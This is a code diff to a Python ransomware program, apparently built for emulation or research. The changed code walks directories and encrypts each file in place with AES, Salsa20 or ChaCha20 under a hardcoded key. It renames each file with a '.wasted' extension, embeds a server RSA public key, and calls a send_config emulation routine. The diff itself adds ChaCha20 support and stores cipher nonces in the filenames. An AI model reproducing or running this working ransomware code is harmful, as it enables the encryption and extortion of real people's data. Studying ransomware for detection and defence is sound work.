@@ -4,14 +4,13 @@ import sys
 import time
 from base64 import b64encode, b64decode
 
-from Crypto.Cipher import AES, Salsa20, PKCS1_OAEP
+from Crypto.Cipher import AES, ChaCha20, Salsa20, PKCS1_OAEP
 from Crypto.PublicKey import RSA
 from Crypto.Util import Counter
 from Crypto.Util.Padding import pad, unpad
-from cryptography.fernet import Fernet
 
-from globals import get_config_from_file
 from emulate import send_config
+from globals import get_config_from_file
 
 # ============================================================
 # ============ 		GLOBALS 	  ==============
@@ -26,7 +25,7 @@ EXTENSION = ".wasted"  # Ransomware custom extension
 # ============================================================
 
 #  set to either: '128/192/256 bit plaintext key' or False
-HARDCODED_KEY = b'+KbPeShVmYq3t6w9z$C&F)H@McQfTjWn'  # AES 256-key used to encrypt files
+HARDCODED_KEY = b'+KbPeShVmYq3t6w9z$C&F)H@McQfTjWn'  # 32-bytes AES 256-key used to encrypt files
 SERVER_PUBLIC_RSA_KEY = '''-----BEGIN PUBLIC KEY-----
 MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAklmKLXGK6jfMis4ifjlB
 xSGMFCj1RtSA/sQxs4I5IWvMxYSD1rZc+f3c67DJ6M8aajHxZTidXm+KEGk2LGXT
@@ -162,18 +161,20 @@ def select_encryption_algorithm(key):
     match config["ALGORITHM"]["algo"]:
         case "AES-CBC":
             assert len(key) in [16, 24, 32]
-            crypt = AES.new(key=key, mode=AES.MODE_CBC)
-            return crypt, ".0", b64encode(crypt.iv).decode("utf-8").replace("/", "-#-")  # avoid "/" in filenames
+            cipher = AES.new(key=key, mode=AES.MODE_CBC)
+            return cipher, ".0", b64encode(cipher.iv).decode("utf-8").replace("/", "-#-")  # avoid "/" in filenames
         case "AES-CTR":
             assert len(key) in [16, 24, 32]
             ctr = Counter.new(128)
             return AES.new(key=key, mode=AES.MODE_CTR, counter=ctr), ".1", None
         case "Salsa20":
             assert len(key) == 32
-            return Salsa20.new(key=key), ".2", None
-        case "Fernet":
+            cipher = Salsa20.new(key=key)
+            return cipher, ".2", b64encode(cipher.nonce).decode("utf-8").replace("/", "-#-")  # avoid "/" in filenames
+        case "ChaCha20":
             assert len(key) == 32
-            return Fernet(key=key), ".3", None
+            cipher = ChaCha20.new(key=key)
+            return cipher, ".3", b64encode(cipher.nonce).decode("utf-8").replace("/", "-#-")  # avoid "/" in filenames
         case _:
             assert len(key) in [16, 24, 32]
             print("unknown encryption algorithm config used. Falling back to default AES-CTR encryption")
@@ -195,10 +196,10 @@ def select_decryption_algorithm(filename, key):
             return AES.new(key=key, mode=AES.MODE_CTR, counter=ctr), "1"
         case "2":
             assert len(key) == 32
-            return Salsa20.new(key=key), "2"
+            return Salsa20.new(key=key, nonce=b64decode(extra.replace("-#-", "/"))), "2"
         case "3":
             assert len(key) == 32
-            return Fernet(key=key), "3"
+            return ChaCha20.new(key=key, nonce=b64decode(extra.replace("-#-", "/"))), "3"
         case _:
             assert len(key) in [16, 24, 32]
             print("unknown encryption algorithm config was used. Falling back to default AES-CTR decryption")
@@ -213,6 +214,7 @@ def encrypt_files(key, start_dirs):
     # TODO: remove development variables
     sleep_test = 1
     updated = False
+    config_nr = 1
 
     # Recursively go through folders and encrypt files
     for curr_dir in start_dirs:
@@ -227,19 +229,20 @@ def encrypt_files(key, start_dirs):
                 print(os.path.getsize(file), file, file_counter)  # file size in bytes (= nr of characters)
 
                 crypt, flag, extra = select_encryption_algorithm(key)
-                modify_file_inplace(file, crypt.encrypt, flag[1:]+"0")
+                modify_file_inplace(file, crypt.encrypt, flag[1:] + "0")
 
-                encrypted_name = file + (flag if not extra else flag+"--"+extra) + EXTENSION
+                encrypted_name = file + (flag if not extra else flag + "--" + extra) + EXTENSION
                 os.rename(file, encrypted_name)
                 print("File changed from " + file + " to " + encrypted_name)  # keep!
 
                 # TODO: remove mimic block
+                if sleep_test > 1 and not updated:
+                    send_config(config_nr)
+                    updated = True
+                    config_nr += 1
                 print("mimic size with", sleep_test)
                 time.sleep(sleep_test)
                 sleep_test *= 2
-                if sleep_test > 1 and not updated:
-                    send_config()
-                    updated = True
 
                 file_counter += 1
 
@@ -269,7 +272,7 @@ def decrypt_files(key, start_dirs):
             if file.endswith(EXTENSION):
                 # do not use double encrypt for decrypt (might work with this setup, but not guaranteed)
                 crypt, flag = select_decryption_algorithm(file, key)
-                modify_file_inplace(file, crypt.decrypt, flag[-1]+"1")
+                modify_file_inplace(file, crypt.decrypt, flag[-1] + "1")
 
                 abs_dir = os.path.dirname(file)
                 file_original = ".".join(os.path.basename(file).split(".")[:-2])
